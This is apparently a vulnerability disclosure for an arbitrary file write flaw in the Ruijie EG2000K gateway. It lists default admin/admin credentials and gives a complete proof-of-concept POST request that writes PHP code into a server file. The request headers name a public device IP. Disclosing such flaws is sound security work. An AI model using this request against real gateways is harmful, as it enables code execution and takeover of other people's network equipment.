## Ruijie EG2000K Easy Gateway has an arbitrary file writing vulnerability

## supplier
https://www.ruijie.com.cn/

## Affected version
RuiJie EG2000K

## Vulnerability file
/tool/controller/download.controller.php

## describe
Ruijie Networks is a professional network manufacturer with a full range of network equipment product lines and solutions including switches, routers, software, security firewalls, wireless products, storage, etc.
Ruijie EG2000K gateway has an arbitrary file writing vulnerability. An attacker can obtain server permissions through the vulnerability, causing the server to crash.


1.local reproduction
The login interface is as shown in the figure
Account/Password admin/admin
<img width="1651" alt="image" src="https://github.com/user-attachments/assets/bc51ca89-e9b5-45e7-90cc-c139bd872448">
<img width="1697" alt="image" src="https://github.com/user-attachments/assets/70ce8187-a1e4-49cb-93be-7b8a39773547">

2. Through the following POC, write <?php phpinfo();?> into the content.php file.

POC
```
POST /tool/index.php?c=download&a=save HTTP/1.1
Host: 127.0.0.1:4430
Cookie: LOCAL_LANG_COOKIE=zh; helpKey=home_sys; RUIJIEID=48m0l3tmicmru617t91md5hqe7; user=admin; HOME_ALERT=44483
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 41
Origin: https://218.200.8.118:4430
Referer: https://218.200.8.118:4430/stability_pi/stability_eg2000k.htm
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 192.168.12.3
Te: trailers
Connection: keep-alive

content=<?php phpinfo();&file=content.php
```

<img width="1690" alt="image" src="https://github.com/user-attachments/assets/86e589d0-9111-49cd-a96e-ea44861c86df">

3.Visit tool/content.php
<img width="1334" alt="image" src="https://github.com/user-attachments/assets/0212baab-8234-456c-bdee-ee4f6a98d4c3">











